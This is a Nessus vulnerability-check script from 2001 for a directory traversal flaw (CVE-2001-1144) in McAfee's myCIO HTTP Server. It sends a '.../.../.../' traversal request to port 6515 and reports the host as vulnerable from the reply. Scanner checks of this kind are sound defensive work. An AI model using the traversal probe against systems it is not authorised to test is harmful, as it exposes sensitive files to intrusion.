#
# Copyright 2001 by Noam Rathaus <noamr@securiteam.com> 
#
# See the Nessus Scripts License for details
#
#

if(description)
{
 script_id(10706); 
 script_cve_id("CVE-2001-1144");
 script_bugtraq_id(3020);
 script_version ("$Revision: 1.12 $");
 
 name["english"] = "McAfee myCIO Directory Traversal";
 script_name(english:name["english"]);
 
 desc["english"] = "The remote host runs McAfee's myCIO HTTP Server, which is vulnerable to Directory Traversal.
A security vulnerability in the product allows attackers to traverse outside the normal HTTP root path, and this exposes access to sensitive files.

Solution: Configure your firewall to block access to this port (TCP 6515). Use the Auto Update feature of McAfee's myCIO to get the latest version. 

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "McAfee myCIO Directory Traversal";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 family["english"] = "Remote file access";
 script_family(english:family["english"]);

 script_copyright(english:"This script is Copyright (C) 2001 SecuriTeam");
 script_dependencie("find_service.nes");
 script_require_ports("Services/mycio", 6515);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_kb_item("Services/mycio");
if (!port) port = 6515;

if(get_port_state(port))
{
 banner = get_http_banner(port:port);
 if(!banner)exit(0);
 
 if ("myCIO" >< banner)
 {
  soctcp6515 = http_open_socket(port);
  data = http_get(item:string(".../.../.../"), port:port);
  resultsend = send(socket:soctcp6515, data:data);
  resultrecv = http_recv(socket:soctcp6515);
  http_close_socket(soctcp6515);
  if ("Last Modified" >< resultrecv) security_hole(port:port);
 }
}
 
